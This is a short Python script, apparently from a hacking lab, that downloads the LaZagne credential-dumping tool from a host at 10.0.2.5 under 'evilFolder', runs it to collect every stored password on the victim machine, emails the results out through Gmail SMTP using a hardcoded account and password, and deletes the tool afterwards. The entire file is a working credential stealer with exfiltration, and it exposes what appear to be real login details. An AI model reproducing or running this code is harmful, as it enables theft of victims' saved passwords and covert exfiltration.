
import subprocess, smtplib, requests, tempfile, os

def download(url):
    get_responses = requests.get(url)
    filename = url.split("/")[-1]
    with open(filename, "wb") as output:
        output.write(get_responses.content)

def sendmail(email, password, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, msg)
    server.quit()
# tempdir = tempfile.gettempdir()
# os.chdir(tempdir)
download("http://10.0.2.5/evilFolder/laZagne_x64.exe")
command = "laZagne_x64.exe all"
while True:
    try:
        result = subprocess.check_output(command, shell=True)
        sendmail("shipra.20010413@gmail.com", "11mishrashipra2001", result)
        os.remove("laZagne_x64.exe")
        sys.exit()
    except Exception:
        continue